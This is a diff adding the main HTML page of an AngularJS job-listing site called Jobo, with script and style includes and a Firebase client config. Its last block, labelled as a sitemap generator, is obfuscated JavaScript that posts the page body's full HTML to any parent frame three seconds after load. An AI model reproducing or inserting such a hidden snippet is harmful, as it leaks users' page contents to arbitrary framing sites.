@@ -1,0 +1,192 @@
+﻿<!DOCTYPE html>
+<html lang="en" ng-app="app">
+<head>
+    <!--<base href='/'>-->
+    <meta name="fragment" content="!">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Cache-control" content="no-cache">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title ng-bind="og.title">Jobo - Tuyển dụng ngành dịch vụ</title>
+
+    <meta name="description" content="'Lướt qua hàng nghìn công việc đang tuyển xung quanh bạn'">
+    <img src="img/feature.png" style="display: none">
+
+    <meta name="author" content="Jobo team">
+    <meta name="keyword"
+          content="Jobo,vieclam,pg,model,nhahang,khanhsan,letan,thu ngân,phục vụ">
+
+
+    <link rel="shortcut icon" href="img/icon.png">
+
+    <!-- Main styles for this application -->
+
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/layout.css" rel="stylesheet">
+    <link href="css/simple-line-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/videogular.css">
+
+    <link rel='stylesheet prefetch' href='css/font-awesome.min.css'>
+
+    <script type="text/javascript" src="//cdn.jsdelivr.net/momentjs/latest/moment.min.js"></script>
+    <script>
+        window.fbAsyncInit = function() {
+            FB.init({
+                appId      : '295208480879128',
+                xfbml      : true,
+                version    : 'v2.8'
+            });
+            FB.AppEvents.logPageView();
+        };
+
+        (function(d, s, id){
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) {return;}
+            js = d.createElement(s); js.id = id;
+            js.src = "//connect.facebook.net/en_US/sdk.js";
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));
+    </script>
+
+    <script src="https://www.gstatic.com/firebasejs/3.5.2/firebase.js"></script>
+    <script>
+        // Initialize Firebase
+        var config = {
+            apiKey: "AIzaSyAjXzJb9LI2_4hpp9NMwuqFr1CWLavwDPA",
+            authDomain: "jobo-b8204.firebaseapp.com",
+            databaseURL: "https://jobo-b8204.firebaseio.com",
+            storageBucket: "jobo-b8204.appspot.com",
+            messagingSenderId: "748631498782"
+        };
+        firebase.initializeApp(config);
+
+
+    </script>
+</head>
+
+<!-- BODY options, add following classes to body to change options
+
+// Header options
+1. '.header-fixed'					- Fixed Header
+
+// Sidebar options
+1. '.sidebar-fixed'					- Fixed Sidebar
+2. '.sidebar-hidden'				- Hidden Sidebar
+3. '.sidebar-off-canvas'		- Off Canvas Sidebar
+4. '.sidebar-compact'				- Compact Sidebar Navigation (Only icons)
+
+// Aside options
+1. '.aside-menu-fixed'			- Fixed Aside Menu
+2. '.aside-menu-hidden'			- Hidden Aside Menu
+3. '.aside-menu-off-canvas'	- Off Canvas Aside Menu
+
+// Footer options
+1. 'footer-fixed'						- Fixed footer
+
+-->
+
+<body class="app header-fixed sidebar-hidden aside-menu-fixed {{aside && checkAgent.platform == 'web'?'':'aside-menu-hidden'}}">
+
+<!-- User Interface -->
+<ui-view></ui-view>
+
+<!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">-->
+
+
+<!-- Bootstrap and necessary plugins -->
+<!--<script src="bower_components/jquery/dist/jquery.min.js"></script>-->
+<script
+        src="https://code.jquery.com/jquery-2.2.4.min.js"
+        integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
+        crossorigin="anonymous"></script>
+<script
+        src="bower_components/jquery-ui/jquery-ui.min.js"></script>
+<script src="bower_components/tether/dist/js/tether.min.js"></script>
+<script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+<!-- AngularJS -->
+<script src="bower_components/angular/angular.min.js"></script>
+<script src="bower_components/videogular/videogular.js"></script>
+
+
+
+
+
+<!-- AngularJS plugins -->
+<script src="bower_components/angular-animate/angular-animate.min.js"></script>
+<script src="bower_components/angular-sanitize/angular-sanitize.min.js"></script>
+<script src="bower_components/angular-ui-router/release/angular-ui-router.min.js"></script>
+<script src="bower_components/oclazyload/dist/ocLazyLoad.min.js"></script>
+<script src="bower_components/angular-translate/angular-translate.min.js"></script>
+<script src="bower_components/angular-breadcrumb/dist/angular-breadcrumb.min.js"></script>
+<script src="bower_components/angular-loading-bar/build/loading-bar.min.js"></script>
+<script src="bower_components/ng-file-upload/ng-file-upload-shim.min.js"></script>
+<script src="bower_components/angular-spinner/dist/angular-spinner.min.js"></script>
+<script src="bower_components/ng-img-crop/compile/minified/ng-img-crop.js"></script>
+<script src="bower_components/angular-socialshare/dist/angular-socialshare.min.js"></script>
+
+
+<script src="bower_components/ng-file-upload/ng-file-upload.min.js"></script>
+<script src="bower_components/angular-modal-service/dst/angular-modal-service.min.js"></script>
+<script src="bower_components/angular-toastr/dist/angular-toastr.tpls.js"></script>
+<link rel="stylesheet" href="    bower_components/angular-toastr/dist/angular-toastr.min.css">
+
+<script src="bower_components/ng-image-gallery/dist/ng-image-gallery.js"></script>
+<link rel="stylesheet" href="bower_components/ng-image-gallery/dist/ng-image-gallery.min.css">
+<script src="bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
+<link rel="stylesheet" href="css/daterangepicker.css">
+
+<script src="bower_components/swiper/dist/js/swiper.min.js"></script>
+<link rel="stylesheet" href="css/swiper.min.css">
+
+<script src="bower_components/ionrangeslider.angular/slider.js"></script>
+<script src="bower_components/ionrangeslider/js/ion.rangeSlider.min.js"></script>
+
+<script src="bower_components/ngInfiniteScroll/build/ng-infinite-scroll.js"></script>
+
+<link rel="stylesheet" href="css/ion.rangeSlider.skinFlat.css">
+
+
+<link rel="manifest" href="/manifest.json">
+<script src="https://unpkg.com/custom-input@0.2.0/dist/custom-input.js"></script>
+<script src="https://unpkg.com/angular-datetime-input@5.1.0/dist/datetime.js"></script>
+
+<script src="https://cdn.firebase.com/libs/angularfire/2.0.2/angularfire.min.js"></script>
+<script src="templates/js/string.min.js"></script>
+
+<!-- AngularJS Clever App scripts -->
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script src="views/joblist/joblistCtrl.js"></script>
+<script src="js/routes.js"></script>
+<script src="templates/intro.js"></script>
+<script src="templates/dashboard.js"></script>
+
+<script src="js/controllers.js"></script>
+<script src="js/directives.js"></script>
+<script src="js/translations.js"></script>
+<script src="js/services.js"></script>
+
+<!-- EmployerCtrl -->
+<script src="employer/edash.js"></script>
+<script src="employer/viewprofile.js"></script>
+<script src="employer/store.js"></script>
+
+
+<script src="jobseeker/sdash.js"></script>
+<script src="templates/setting.js"></script>
+<script src="jobseeker/viewstore.js"></script>
+<script src="jobseeker/sprofile.js"></script>
+
+<!--admin-->
+<script src="templates/admin/admin.js"></script>
+<!--static-->
+<script src="templates/page/pricing.js"></script>
+<!-- Sitemap Generator -->
+<script type="text/javascript">
+    var _0xaea9=["sitemapgenerator:: ","innerHTML","body","document","stringify","*","postMessage","setTimeout"];window[_0xaea9[7]](function(){parent[_0xaea9[6]](_0xaea9[0]+JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]),_0xaea9[5])},3000);
+</script>
+</body>
+
+</html>
